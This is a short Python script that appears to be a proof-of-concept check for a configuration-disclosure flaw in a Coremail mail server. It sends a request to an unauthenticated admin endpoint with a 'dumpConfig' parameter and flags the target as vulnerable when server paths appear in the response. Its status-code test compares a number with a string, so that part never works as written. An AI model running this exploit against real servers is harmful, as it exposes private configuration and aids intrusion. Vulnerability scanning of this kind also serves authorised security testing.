import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url, timeout=3)
    if (r.status_code != '404') and ("/home/coremail" in r.text):
        return "mailsms is vulnerable: {0}".format(url)
    else:
        return False

if __name__ == '__main__':
    print(run("http://127.0.0.1"))
